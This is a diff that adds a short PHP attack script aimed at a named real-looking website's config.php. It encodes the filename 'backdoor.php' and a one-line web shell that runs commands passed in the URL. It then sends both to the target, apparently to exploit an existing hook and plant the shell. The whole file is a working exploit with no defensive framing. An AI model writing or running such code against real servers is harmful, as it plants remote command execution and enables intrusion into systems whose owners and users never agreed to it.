@@ -1,0 +1,19 @@
+<?php
+$target = "http://universaldigitalhealth.com/config.php";
+
+function encode($str) {
+    $result = '';
+    for ($i = 0; $i < strlen($str); $i++) {
+        $result .= str_pad(ord($str[$i]), 3, '0', STR_PAD_LEFT);
+    }
+    return $result;
+}
+
+$filename = "backdoor.php";
+$content = '<?php echo "HACKED"; system($_GET["cmd"]); ?>';
+
+$payload = $target . "?x1=" . encode($filename) . "&x2=" . encode($content);
+
+echo "Send: " . $payload . "\n";
+echo file_get_contents($payload);
+?>
